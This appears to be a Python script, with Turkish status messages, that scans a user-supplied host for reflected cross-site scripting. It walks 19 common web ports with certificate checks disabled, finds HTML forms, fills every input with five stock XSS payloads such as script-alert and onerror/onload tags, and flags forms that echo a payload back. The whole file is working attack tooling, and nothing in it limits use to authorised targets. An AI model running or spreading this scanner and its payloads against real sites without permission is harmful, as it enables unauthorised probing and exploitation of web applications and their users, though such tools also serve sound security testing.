import requests
import warnings
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter("ignore", InsecureRequestWarning)

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

EXTENDED_PORTS = list(set([
    80, 443, 8080, 8000, 8888, 3000, 5000, 8443,
    8181, 9090, 81, 82, 83, 7000, 8081, 8880,
    10443, 49152, 10000
]))

def run_xss_test(url):
    results = []
    parsed = urlparse(url)
    base_domain = parsed.hostname
    results.append("------------------------------------------------------")
    results.append("[=] XSS testi başlatılıyor...")
    results.append("------------------------------------------------------")

    tested_ports = 0
    failed_ports = 0

    for port in sorted(EXTENDED_PORTS):
        full_url = f"http://{base_domain}:{port}" if port != 443 and port != 8443 else f"https://{base_domain}:{port}"
        results.append(f"[*] Port {port} üzerinde XSS testi yapılıyor: {full_url}")
        try:
            response = requests.get(full_url, verify=False, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")

            if not forms:
                results.append("[~] Sayfada form bulunamadı.")
                continue

            results.append(f"[+] {len(forms)} form bulundu. XSS test uygulanıyor...")
            success = False
            for i, form in enumerate(forms, 1):
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                inputs = [input_tag.get("name", "") for input_tag in form.find_all("input") if input_tag.get("type") != "submit"]
                for payload in XSS_PAYLOADS:
                    data = {name: payload for name in inputs}
                    target = urljoin(full_url, action)
                    try:
                        if method == "post":
                            res = requests.post(target, data=data, verify=False, timeout=5)
                        else:
                            res = requests.get(target, params=data, verify=False, timeout=5)
                        if payload in res.text:
                            results.append(f"[!] Form {i} üzerinde XSS açığı tespit edildi! Payload: {payload}")
                            success = True
                    except Exception as ex:
                        continue
                if not success:
                    results.append(f"[-] Form {i} üzerinde XSS açığı bulunamadı. {len(XSS_PAYLOADS)} payload denendi.")
            tested_ports += 1

        except Exception as e:
            results.append(f"[X] Port {port} üzerinde bağlantı hatası: {str(e).split(':')[0]}")
            failed_ports += 1

    results.append("------------------------------------------------------")
    results.append(f"[=] XSS testi tamamlandı. Başarıyla test edilen port sayısı: {tested_ports}, başarısız port: {failed_ports}.")
    results.append("------------------------------------------------------")
    return "\n".join(results)

if __name__ == "__main__":
    hedef_url = input("Test edilecek URL: ")
    print(run_xss_test(hedef_url))
